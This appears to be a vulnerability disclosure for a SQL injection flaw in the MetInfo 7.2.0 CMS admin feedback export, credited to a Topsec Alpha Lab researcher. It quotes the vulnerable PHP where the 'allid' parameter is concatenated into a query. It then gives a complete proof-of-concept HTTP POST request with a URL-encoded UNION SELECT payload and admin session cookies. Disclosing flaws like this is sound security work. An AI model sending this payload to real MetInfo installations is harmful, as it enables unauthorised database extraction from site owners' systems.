## 1.Technical Description:
locate in /app/system/feedback/admin/feedback_admin.class.php line:564 to 647:

....
$allid = $_M['form']['allid'];
....
if ($allid) {
            $where .= " AND `id` in ({$allid}) ";
        }
....
....
....
$order = ' ORDER BY addtime desc';
$query = "SELECT * FROM {$_M['table']['feedback']} WHERE {$where} {$order}";
$feedbacklist = DB::get_all($query);
## 2.poc
Use the Google Chrome open this test site.download the latest version（ https://www.metinfo.cn/download/)

```
POST /MetInfo7.2.0/admin/index.php?lang=cn&anyid=&n=feedback&c=feedback_admin&a=doexport&class1=1&met_fd_export=-1&check_id=1&allid=1%29%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%4f%4e%43%41%54%28%30%78%37%31%37%61%37%36%36%62%37%31%2c%30%78%34%65%36%64%36%34%37%31%37%35%35%32%36%36%35%30%34%62%35%38%36%61%37%61%36%31%34%64%34%65%36%31%36%35%35%61%37%32%34%61%34%62%34%62%37%32%36%31%37%38%36%35%36%38%35%35%37%32%34%38%36%65%36%62%35%39%36%33%35%33%36%37%37%32%37%37%35%30%36%38%2c%30%78%37%31%36%62%37%30%37%38%37%31%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20%2d%23 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/MetInfo7.2.0/admin/
Cookie: PHPSESSID=8d5lno19uc4t6aj69vthkcihc3; admin_lang=cn; arrlanguage=metinfo; app_href_source=myapp/free; Hm_lvt_520556228c0113270c0c772027905838=1615185471; Hm_lpvt_520556228c0113270c0c772027905838=1615253331; XDEBUG_SESSION=XDEBUG_ECLIPSE; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo7.2.0%2Fadmin%2F%3Fm%3Dinclude%26c%3Dloadtemp%26a%3Ddoviewhtml; met_auth=bbaeUTaDg6dSvOsTfwBIy3SIujfz5t6wVu5pvAMUKC56FNTU6tqpx9nlmM96DB8LgMxwvhHvmmumUuanixKt%2BjbNGQ; met_key=9HT1nfR; page_iframe_url=http%3A%2F%2F127.0.0.1%2FMetInfo7.2.0%2Findex.php%3Flang%3Dcn%26pageset%3D1; met_auths=1;metinfo_admin_name=admin1

```
## Reporter:
jiedeidei from Topsec Alpha Lab
